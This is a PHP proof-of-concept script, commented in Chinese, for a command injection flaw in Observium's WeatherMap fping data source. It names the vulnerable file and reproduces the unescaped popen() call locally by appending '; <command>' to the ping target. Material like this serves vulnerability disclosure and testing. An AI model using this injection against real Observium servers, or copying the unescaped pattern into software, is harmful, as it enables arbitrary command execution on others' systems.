<?php
/**
 * PoC: Observium WeatherMap fping 数据源 OS 命令注入
 *
 * 漏洞位置:
 *   includes/weathermap/lib/datasources/WeatherMapDataSource_fping.php
 *   ReadData() 中:
 *     $target  = $matches[1];   // 来自 "fping:<target>" 的 <target>
 *     $command = $this->fping_cmd." ... -q $target 2>&1";
 *     $pipe    = popen($command, "r");   // 未转义 → 命令注入
 *
 * 用法:
 *   php poc_fping_cmd_injection.php "<注入命令>" [fping路径] [target主机]
 *
 * 示例:
 *   php poc_fping_cmd_injection.php "id"
 *   php poc_fping_cmd_injection.php "id > /tmp/pwned.txt" /usr/bin/fping 127.0.0.1
 *
 * 说明: 本脚本忠实复现源码中未转义 target 拼入 popen 的脆弱模式，仅用于授权测试。
 */

$inj_cmd  = $argv[1] ?? 'id';
$fping    = $argv[2] ?? '/usr/bin/fping';
$target   = $argv[3] ?? '127.0.0.1';
$ping_cnt = 5;

// 与源码一致: target 未做任何 shell 转义
$malicious_target = $target . '; ' . $inj_cmd . ' 2>&1; echo';
$command = $fping . " -t100 -r1 -p20 -u -C $ping_cnt -i10 -q " . $malicious_target . " 2>&1";

echo "[构造命令] $command\n\n";

$pipe = popen($command, 'r');
if (is_resource($pipe)) {
    while (!feof($pipe)) {
        echo fgets($pipe, 4096);
    }
    pclose($pipe);
}

echo "\n[注入命令 \"$inj_cmd\" 已执行]\n";
